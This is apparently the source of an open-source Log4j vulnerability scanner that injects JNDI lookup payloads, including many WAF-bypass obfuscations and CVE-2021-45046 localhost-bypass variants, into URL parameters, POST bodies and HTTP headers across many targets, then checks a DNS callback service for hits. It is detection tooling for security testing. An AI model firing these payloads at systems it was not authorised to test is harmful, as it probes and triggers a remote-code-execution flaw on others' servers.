import random, os 
import requests
from requests.exceptions import ConnectionError
import time
import sys
from urllib import parse as urlparse
import random
from log4jscanner.DNSCallBackProvider import Interactsh, Dnslog
import concurrent.futures
import pyfiglet
import argparse
from colorama import init
from colorama import Fore, Back, Style
init()

import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()

class Log4jScanner:
    def __init__(self, file_containing_urls, url_list, ThreadNumber, timeout, custom_dns_callback_host, dns_callback_provider, disable_redirect, exclude_user_agent_fuzzing, basic_scan, file_containing_headers):
        self.file_containing_urls            = file_containing_urls
        self.ThreadNumber                    = ThreadNumber
        self.url_list                        = url_list

        if "db/header" in file_containing_headers:
            self.headers_file                = os.path.dirname(__file__) + "/" + file_containing_headers
        self.exclude_user_agent_fuzzing      = exclude_user_agent_fuzzing  # If True, then Will Not Fuzz 'User-Agent' Header
        self.disable_redirects               = disable_redirect 
        self.custom_dns_callback_host        = custom_dns_callback_host
        self.dns_callback_provider           = dns_callback_provider  # "dnslog.cn" , "interact.sh"
        self.basic_scan                      = basic_scan 
        self.wait_time_before_dns_logs_check = 10
        self.timeout                         = timeout
        self.proxies = {}
        # self.proxies = {'http': 'http://127.0.0.1:8081', 'https': 'https://127.0.0.1:8081'} 

        self.default_headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36',
            'Accept': '*/*' 
        }

        self.post_data_parameters = ["username", "user", "email", "email_address", "password", "id", "action", "page", "q", "submit", "token", "data", "order", "lang", "search", "redirect", "country", "hidden"]

        self.waf_bypass_payloads = [
            "${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{{callback_host}}/{{random}}}",
            "${${::-j}ndi:rmi://{{callback_host}}/{{random}}}",
            "${jndi:rmi://{{callback_host}}}",
            "${${lower:jndi}:${lower:rmi}://{{callback_host}}/{{random}}}",
            "${${lower:${lower:jndi}}:${lower:rmi}://{{callback_host}}/{{random}}}",
            "${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://{{callback_host}}/{{random}}}",
            "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://{{callback_host}}/{{random}}}",
            "${jndi:dns://{{callback_host}}}",

            "${${date:'j'}${date:'n'}${date:'d'}${date:'i'}:ldap://{{callback_host}}/{{random}}}",
            "${${date:'j'}${date:'n'}${date:'d'}${date:'i'}:LDAP://{{callback_host}}/{{random}}}",
            "${${date:'j'}${date:'n'}${date:'d'}${date:'i'}:Ldap://{{callback_host}}/{{random}}}",
            "${${date:'j'}${date:'n'}${date:'d'}${date:'i'}:lDap://{{callback_host}}/{{random}}}",
            "${${date:'j'}${date:'n'}${date:'d'}${date:'i'}:ldAp://{{callback_host}}/{{random}}}",
            "${${date:'j'}${date:'n'}${date:'d'}${date:'i'}:LdaP://{{callback_host}}/{{random}}}",

            "${${date:'j'}${date:'n'}${date:'d'}${date:'i'}:rmi://{{callback_host}}/{{random}}}",
            "${${date:'j'}${date:'n'}${date:'d'}${date:'i'}:RMI://{{callback_host}}/{{random}}}",
            "${${date:'j'}${date:'n'}${date:'d'}${date:'i'}:Rmi://{{callback_host}}/{{random}}}",
            "${${date:'j'}${date:'n'}${date:'d'}${date:'i'}:rMi://{{callback_host}}/{{random}}}",
            "${${date:'j'}${date:'n'}${date:'d'}${date:'i'}:rmI://{{callback_host}}/{{random}}}", 

            "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://{{callback_host}}/{{random}}}",

            "${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//{{callback_host}}/{{random}}}",
            "${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-r}mi${env:NaN:-:}//{{callback_host}}/{{random}}}",

            "${jndi${nagli:-:}ldap:${::-/}/{{callback_host}}/{{random}}}",
            "${j${k8s:k5:-ND}i${sd:k5:-:}ldap://{{callback_host}}/{{random}}}",
            "${${env:HL:-j}ndi:ldap:${:::::::::-//}{{callback_host}}/{{random}}}",
            "${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//{{callback_host}}/{{random}}}",
        ]

        self.cve_2021_45046 = [
            "${jndi:ldap://127.0.0.1#{{callback_host}}:1389/{{random}}}", 
            "${jndi:ldap://127.0.0.1#{{callback_host}}/{{random}}}",
            "${jndi:ldap://127.1.1.1#{{callback_host}}/{{random}}}"
        ]          

    def start(self):
        print(f"{Fore.GREEN}[+] {Fore.RED}Initiating {Fore.GREEN}Log4j Scanner {Fore.YELLOW}[Author: {Fore.GREEN}Pushpender Singh{Fore.YELLOW}] [{Fore.GREEN}https://github.com/PushpenderIndia{Fore.YELLOW}]{Style.RESET_ALL}")
        if self.file_containing_urls != "":
            with open(self.file_containing_urls, encoding='utf-8') as f:
                for url in f.readlines():
                    url = str(url).strip()
                    if url != "" and not url.startswith("#"):
                        self.url_list.append(url)

        if self.custom_dns_callback_host != "":
            print(f"{Fore.YELLOW}[+] Using custom DNS Callback host [{Fore.GREEN}{self.custom_dns_callback_host}{Fore.YELLOW}]. {Fore.RED}No verification will be done after sending fuzz requests.{Style.RESET_ALL}")
            dns_callback_host =  self.custom_dns_callback_host
        else:
            print(f"{Fore.GREEN}[+] Initiating DNS callback server ({Fore.YELLOW}{self.dns_callback_provider}{Fore.GREEN}).{Style.RESET_ALL}")
            if self.dns_callback_provider == "interact.sh":
                dns_callback = Interactsh()
            elif self.dns_callback_provider == "dnslog.cn":
                dns_callback = Dnslog()
            else:
                print(f"{Fore.RED}[!] Invalid DNS Callback provider{Style.RESET_ALL}")
                sys.exit()
            dns_callback_host = dns_callback.domain

        print("="*150)
        print(f"{Fore.GREEN}[+] Log4jScanner is Capable of Scanning these CVEs{Style.RESET_ALL}")
        print("="*150)
        print(f"{Fore.WHITE}1. CVE-2021-44228 [{Fore.RED}(RCE) - Critical{Fore.WHITE}] (Fixed in version 2.15.0) : Affecting Log4j versions 2.0-beta9 to 2.14.1")
        print(f"{Fore.WHITE}2. CVE-2021-45046 [{Fore.RED}(RCE) - Critical{Fore.WHITE}] (Fixed in version 2.16.0) : Affecting Log4j versions 2.0-beta9 to 2.15.0, excluding 2.12.2 ")        
        # print("3. CVE-2021-45105 [(DOS) - High    ] (Fixed in version 2.17.0) : Affecting Log4j versions 2.0-beta9 to 2.16.0")
        print("="*150)
        if self.basic_scan:
            print(f"{Fore.WHITE}[>>] Total Payloads Loaded: {Fore.GREEN}1{Fore.WHITE} | Scan Type: {Fore.GREEN}Basic Scan{Style.RESET_ALL}")
        else:
            total_payloads_loaded = len(self.waf_bypass_payloads) + len(self.cve_2021_45046) + 1
            print(f"{Fore.WHITE}[>>] Total Payloads Loaded: {Fore.GREEN}{total_payloads_loaded}{Fore.WHITE} | Scan Type: {Fore.GREEN}Full Scan{Style.RESET_ALL}")
        print("="*150)

        # for url in self.url_list:
        #     self.scan_url(url, dns_callback_host)

        # Multi-Threaded Implementation
        executor = concurrent.futures.ThreadPoolExecutor(max_workers=self.ThreadNumber)
        futures = [executor.submit(self.scan_url, url, dns_callback_host) for url in self.url_list]
        concurrent.futures.wait(futures) 

        if self.custom_dns_callback_host != "":
            print(f"{Fore.GREEN}[+] Payloads are sent to all URLs. Custom DNS Callback host is provided, please check your logs to verify the existence of the vulnerability. Exiting.{Style.RESET_ALL}")
            return

        print("="*150)
        print(f"{Fore.YELLOW}[*] Payloads are sent to all URLs. {Fore.GREEN}Waiting for DNS OOB callbacks.{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Waiting...{Style.RESET_ALL}")
        print("="*150)
        time.sleep(self.wait_time_before_dns_logs_check)
        records = dns_callback.pull_logs()
        if len(records) == 0:
            print(f"{Fore.YELLOW}[-] Given URL/URLs {Fore.RED}does not seem to be Vulnerable.{Style.RESET_ALL}")
            return []  # Returing Empty List 
        else:
            print(f"{Fore.YELLOW}[+] Given URL/URLs are {Fore.GREEN}Vulnerable{Fore.YELLOW} to {Fore.GREEN}Log4j RCE : ){Style.RESET_ALL}")
            with open('log4j_pool_data.txt', 'w', encoding='utf-8') as f:
                for vuln_url in records:
                    f.write(str(vuln_url)+"\n")  

            with open("log4j_pool_data.txt") as f:
                vuln_data = f.read()

            vuln_url_list = []
            with open('log4j_vuln.txt', 'w') as file_writer:
                for subdomain in self.url_list:
                    subdomain = subdomain.strip()
                    hostname = subdomain.replace('https://', '').replace('http://', '').split('/')[0].strip()
                    if hostname in vuln_data:
                        print(f"[+] {subdomain}")
                        vuln_url_list.append(subdomain)
                        file_writer.write(subdomain+"\n")  

            return vuln_url_list

    def scan_url(self, url, callback_host):
        parsed_url = self.parse_url(url)

        random_string = ''.join(random.choice('0123456789abcdefghijklmnopqrstuvwxyz') for i in range(7))

        # ${jndi:ldap://example.com.callback_url.com/ad3f5g6}
        payload = '${jndi:ldap://%s.%s/%s}' % (parsed_url["host"], callback_host, random_string)
        payloads = [payload]

        if not self.basic_scan:
            payloads.extend(self.get_waf_bypass_payloads(f'{parsed_url["host"]}.{callback_host}', random_string))
            payloads.extend(self.get_cve_2021_45046_payloads(f'{parsed_url["host"]}.{callback_host}', random_string))
        
        for payload in payloads:
            full_url = parsed_url["site"]

            # Performing GET Based Log4j Scan + Without Malicious Header 
            try: 
                response = requests.request(url=full_url, method="GET",  params={"test": payload}, verify=False, timeout=self.timeout, allow_redirects=(not self.disable_redirects), proxies=self.proxies)
                if response.status_code == 200:
                    print(f"{Fore.YELLOW}[*] [{Fore.GREEN}{response.status_code}{Fore.YELLOW}] [{Fore.WHITE}GET + Without Malicious Header{Fore.YELLOW}]                    : {Fore.GREEN}{full_url}{Fore.WHITE} | {Fore.YELLOW}{payload}{Style.RESET_ALL}")            
                else:
                    print(f"{Fore.YELLOW}[*] [{Fore.RED}{response.status_code}{Fore.YELLOW}] [{Fore.WHITE}GET + Without Malicious Header{Fore.YELLOW}]                    : {Fore.GREEN}{full_url}{Fore.WHITE} | {Fore.YELLOW}{payload}{Style.RESET_ALL}") 
            except ConnectionError: print(f"[!] Error: {Fore.RED}Failed to Connect: {full_url}{Style.RESET_ALL}")            
            except Exception as e: print(f"[!] Error: {Fore.RED}{e}{Style.RESET_ALL}")

            # Performing POST Based Log4j Scan + Without Malicious Header 
            try:                
                response = requests.request(url=full_url, method="POST", params={"test": payload}, verify=False, timeout=self.timeout, allow_redirects=(not self.disable_redirects), data=self.get_fuzzing_post_data(payload), proxies=self.proxies)
                if response.status_code == 200:
                    print(f"{Fore.YELLOW}[*] [{Fore.GREEN}{response.status_code}{Fore.YELLOW}] [{Fore.WHITE}POST + Without Malicious Header{Fore.YELLOW}]                   : {Fore.GREEN}{full_url}{Fore.WHITE} | {Fore.YELLOW}{payload}{Style.RESET_ALL}")            
                else:
                    print(f"{Fore.YELLOW}[*] [{Fore.RED}{response.status_code}{Fore.YELLOW}] [{Fore.WHITE}POST + Without Malicious Header{Fore.YELLOW}]                   : {Fore.GREEN}{full_url}{Fore.WHITE} | {Fore.YELLOW}{payload}{Style.RESET_ALL}")             
            except ConnectionError: print(f"[!] Error: {Fore.RED}Failed to Connect: {full_url}{Style.RESET_ALL}")            
            except Exception as e: print(f"[!] Error: {Fore.RED}{e}{Style.RESET_ALL}")

            # Performing POST Based Log4j Scan with Possible Post Parameters + Without Malicious Header 
            try: 
                response = requests.request(url=full_url, method="POST", params={"test": payload}, verify=False, timeout=self.timeout, allow_redirects=(not self.disable_redirects), json=self.get_fuzzing_post_data(payload), proxies=self.proxies)
                if response.status_code == 200:
                    print(f"{Fore.YELLOW}[*] [{Fore.GREEN}{response.status_code}{Fore.YELLOW}] [{Fore.WHITE}POST + Possible Params + Without Malicious Header{Fore.YELLOW}] : {Fore.GREEN}{full_url}{Fore.WHITE} | {Fore.YELLOW}{payload}{Style.RESET_ALL}")            
                else:
                    print(f"{Fore.YELLOW}[*] [{Fore.RED}{response.status_code}{Fore.YELLOW}] [{Fore.WHITE}POST + Possible Params + Without Malicious Header{Fore.YELLOW}] : {Fore.GREEN}{full_url}{Fore.WHITE} | {Fore.YELLOW}{payload}{Style.RESET_ALL}")             
            except ConnectionError: print(f"[!] Error: {Fore.RED}Failed to Connect: {full_url}{Style.RESET_ALL}")            
            except Exception as e: print(f"[!] Error: {Fore.RED}{e}{Style.RESET_ALL}")

            #====================================================================================================================================================================================================================================================================================

            # Performing GET Based Log4j Scan + With Malicious Header 
            try: 
                response = requests.request(url=full_url, method="GET",  params={"test": payload}, headers=self.get_fuzzing_headers(payload), verify=False, timeout=self.timeout, allow_redirects=(not self.disable_redirects), proxies=self.proxies)
                if response.status_code == 200:
                    print(f"{Fore.YELLOW}[*] [{Fore.GREEN}{response.status_code}{Fore.YELLOW}] [{Fore.WHITE}GET + With Malicious Header{Fore.YELLOW}]                       : {Fore.GREEN}{full_url}{Fore.WHITE} | {Fore.YELLOW}{payload}{Style.RESET_ALL}")            
                else:
                    print(f"{Fore.YELLOW}[*] [{Fore.RED}{response.status_code}{Fore.YELLOW}] [{Fore.WHITE}GET + With Malicious Header{Fore.YELLOW}]                       : {Fore.GREEN}{full_url}{Fore.WHITE} | {Fore.YELLOW}{payload}{Style.RESET_ALL}") 
            except ConnectionError: print(f"[!] Error: {Fore.RED}Failed to Connect: {full_url}{Style.RESET_ALL}")
            except Exception as e: print(f"[!] Error: {Fore.RED}{e}{Style.RESET_ALL}")

            # Performing POST Based Log4j Scan + With Malicious Header 
            try:                
                response = requests.request(url=full_url, method="POST", params={"test": payload}, headers=self.get_fuzzing_headers(payload), verify=False, timeout=self.timeout, allow_redirects=(not self.disable_redirects), data=self.get_fuzzing_post_data(payload), proxies=self.proxies)
                if response.status_code == 200:
                    print(f"{Fore.YELLOW}[*] [{Fore.GREEN}{response.status_code}{Fore.YELLOW}] [{Fore.WHITE}POST + With Malicious Header{Fore.YELLOW}]                      : {Fore.GREEN}{full_url}{Fore.WHITE} | {Fore.YELLOW}{payload}{Style.RESET_ALL}")            
                else:
                    print(f"{Fore.YELLOW}[*] [{Fore.RED}{response.status_code}{Fore.YELLOW}] [{Fore.WHITE}POST + With Malicious Header{Fore.YELLOW}]                      : {Fore.GREEN}{full_url}{Fore.WHITE} | {Fore.YELLOW}{payload}{Style.RESET_ALL}")             
            except ConnectionError: print(f"[!] Error: {Fore.RED}Failed to Connect: {full_url}{Style.RESET_ALL}")            
            except Exception as e: print(f"[!] Error: {Fore.RED}{e}{Style.RESET_ALL}")

            # Performing POST Based Log4j Scan with Possible Post Parameters + With Malicious Header 
            try: 
                response = requests.request(url=full_url, method="POST", params={"test": payload}, headers=self.get_fuzzing_headers(payload), verify=False, timeout=self.timeout, allow_redirects=(not self.disable_redirects), json=self.get_fuzzing_post_data(payload), proxies=self.proxies)
                if response.status_code == 200:
                    print(f"{Fore.YELLOW}[*] [{Fore.GREEN}{response.status_code}{Fore.YELLOW}] [{Fore.WHITE}POST + Possible Params + With Malicious Header{Fore.YELLOW}]    : {Fore.GREEN}{full_url}{Fore.WHITE} | {Fore.YELLOW}{payload}{Style.RESET_ALL}")            
                else:
                    print(f"{Fore.YELLOW}[*] [{Fore.RED}{response.status_code}{Fore.YELLOW}] [{Fore.WHITE}POST + Possible Params + With Malicious Header{Fore.YELLOW}]    : {Fore.GREEN}{full_url}{Fore.WHITE} | {Fore.YELLOW}{payload}{Style.RESET_ALL}")             
            except ConnectionError: print(f"[!] Error: {Fore.RED}Failed to Connect: {full_url}{Style.RESET_ALL}")            
            except Exception as e: print(f"[!] Error: {Fore.RED}{e}{Style.RESET_ALL}")


    def get_fuzzing_headers(self, payload):
        """
        Returns a Dict, Containing All Malicious HTTP Request Headers
        """
        fuzzing_headers = {}
        fuzzing_headers.update(self.default_headers)
        with open(self.headers_file) as f:
            for header in f.readlines():
                header = str(header).strip()
                if header != "" and not header.startswith("#"):
                    fuzzing_headers.update({header: payload})
        if self.exclude_user_agent_fuzzing:
            fuzzing_headers["User-Agent"] = self.default_headers["User-Agent"]

        return fuzzing_headers

    def get_fuzzing_post_data(self, payload):
        """
        Returns a Dict, Containing Possible POST Parameter with Log4j Payload as Value
        """
        fuzzing_post_data = {}
        for post_data in self.post_data_parameters:
            fuzzing_post_data.update({post_data: payload})
        return fuzzing_post_data

    def get_waf_bypass_payloads(self, callback_host, random_string):
        """
        Returns a List of Web Application Firewal Bypass Payloads
        """
        payloads = []
        for waf_payload in self.waf_bypass_payloads:
            new_payload = waf_payload.replace("{{callback_host}}", callback_host)
            new_payload = new_payload.replace("{{random}}", random_string)
            payloads.append(new_payload)
        return payloads

    def get_cve_2021_45046_payloads(self, callback_host, random_string):
        """
        Returns a List of LocalHost Restriction Bypass Payload (CVE-2021-45046)
        """
        payloads = []
        for payload in self.cve_2021_45046:
            new_payload = payload.replace("{{callback_host}}", callback_host)
            new_payload = new_payload.replace("{{random}}", random_string)
            payloads.append(new_payload)
        return payloads

    def parse_url(self, url):
        """
        If url = "https://example.com/login.php"
        Then it will Return:
        --------------------
            {
                "scheme"    : "https",
                "site"      : "https://example.com",
                "host"      : "example.com",
                "file_path" : "/login.php",
            }
        """
        url = str(url).replace('#', '%23').replace(' ', '%20')

        if '://' not in url:
            url = "http://" + url

        scheme    = urlparse.urlparse(url).scheme 
        site      = f"{scheme}://{urlparse.urlparse(url).netloc}"
        host      = urlparse.urlparse(url).netloc.split(":")[0]
        file_path = urlparse.urlparse(url).path

        if file_path == '':
            file_path = '/'

        url_dict = {
            "scheme"    : scheme,
            "site"      : site,
            "host"      : host,
            "file_path" : file_path
        }

        return url_dict

def main():
    def get_arguments():
        banner = pyfiglet.figlet_format("            Log4jScanner")
        print(banner+"\n")
        parser = argparse.ArgumentParser(description=f'{Fore.RED}Log4jScanner v1.2 {Fore.YELLOW}[Author: {Fore.GREEN}Pushpender Singh{Fore.YELLOW}] [{Fore.GREEN}https://github.com/PushpenderIndia{Fore.YELLOW}]')
        parser._optionals.title = f"{Fore.GREEN}Optional Arguments{Fore.YELLOW}"
        parser.add_argument("-u", "--url", dest="url",  help=f"{Fore.GREEN}Scan Single URL for Log4j ({Fore.WHITE}CVE-2021-44228{Fore.GREEN}, {Fore.WHITE}CVE-2021-45046{Fore.GREEN}){Fore.YELLOW}")
        parser.add_argument("-m", "--url-list", dest="url_list",  help=f"{Fore.GREEN}Scan Multiple URLs, Give Full Path of File Containing URLs{Fore.YELLOW}")        
        parser.add_argument("-th", "--thread", dest="thread",  help=f"{Fore.GREEN}Thread Number. {Fore.WHITE}default=30{Fore.YELLOW}", default=30)
        parser.add_argument("-t", "--timeout", dest="timeout", help=f"{Fore.GREEN}HTTP Request Timeout. {Fore.WHITE}default=30{Fore.YELLOW}", default=30)
        parser.add_argument("-c", "--callback", dest="custom_callback_host", help=f"{Fore.GREEN}Provide Custom CallBack Host e.g. Burp Collaborator URL. {Fore.WHITE}default=''{Fore.YELLOW}", default="")
        parser.add_argument("-f", "--header-file", dest="file_containing_headers", help=f"{Fore.GREEN}Given File Containing Headers For Fuzzing Log4j Vulnerability. Available Header Files: {Fore.WHITE}db/headers-large.txt{Fore.GREEN}, {Fore.WHITE}db/headers-minimal.txt{Fore.GREEN}. {Fore.WHITE}default='db/headers.txt'{Fore.YELLOW}", default="db/headers.txt")        
        parser.add_argument("-d", "--dns_callback", dest="dns_callback_provider", help=f"{Fore.GREEN}Switch b/w Two Built-in DNS Callback Providers for Verifying Vulnerabilty. Choose from {Fore.YELLOW}dnslog.cn{Fore.GREEN},{Fore.YELLOW}interact.sh{Fore.GREEN}. {Fore.WHITE}default='interact.sh'{Fore.YELLOW}", default="interact.sh")
        parser.add_argument("-nr", "--no-redirect", dest="disable_redirect", help=f"{Fore.GREEN}By Default, Log4jScanner will Follow Redirection & then will Put Payload to Redirected URL, {Fore.YELLOW}Specify this flag to disable redirection.", action='store_true')
        parser.add_argument("-nu", "--no-useragent-fuzz", dest="exclude_user_agent_fuzzing", help=f"{Fore.GREEN}By Default, Log4jScanner will fuzz All Headers Including User-Agent, But Some WAF blocks a HTTP request if Malicious Log4j User-Agent is found, In those Case, Exclude User-Agent Fuzzing. {Fore.YELLOW}Specify this flag to exclude User-Agent Fuzzing.", action='store_true')
        parser.add_argument("-b", "--basic-scan", dest="basic_scan", help=f"{Fore.GREEN}By Default, Log4jScanner will Test Every Single Possible Endpoint e.g. {Fore.WHITE}GET{Fore.GREEN} & {Fore.WHITE}POST Params {Fore.GREEN}& {Fore.WHITE}All Headers{Fore.GREEN} and Will Also Test for WAF Bypass Payload + LocalHost Restriction Bypass Payload. {Fore.YELLOW}Specify this flag if you just want to test basic payload ({Fore.WHITE}"+"${jndi:ldap://target_host.callback_host.com/Exploit}"+f"{Fore.YELLOW}).", action='store_true')

        return parser.parse_args()

    arguments = get_arguments()
    print(f"{Fore.YELLOW}           [Author: {Fore.GREEN}Pushpender Singh{Fore.YELLOW}] [{Fore.GREEN}https://github.com/PushpenderIndia{Fore.YELLOW}]\n\n{Style.RESET_ALL}")

    if arguments.url_list:
        file_containing_urls = arguments.url_list
        url_list = []

    elif arguments.url:
        file_containing_urls = ""
        url_list = [arguments.url]

    else:
        print(f"\n{Fore.RED}[!] No Flag is Specified! Type {Fore.GREEN}{sys.argv[0]} --help{Fore.YELLOW} for more.{Style.RESET_ALL}")
        sys.exit()

    ThreadNumber               = int(arguments.thread)  # 120 on VPS 
    timeout                    = int(arguments.timeout)
    custom_dns_callback_host   = arguments.custom_callback_host
    dns_callback_provider      = arguments.dns_callback_provider
    disable_redirect           = arguments.disable_redirect
    exclude_user_agent_fuzzing = arguments.exclude_user_agent_fuzzing
    basic_scan                 = arguments.basic_scan
    file_containing_headers    = arguments.file_containing_headers
    test = Log4jScanner(file_containing_urls, url_list, ThreadNumber, timeout, custom_dns_callback_host, dns_callback_provider, disable_redirect, exclude_user_agent_fuzzing, basic_scan, file_containing_headers)
    test.start()

if __name__ == "__main__":
    main()

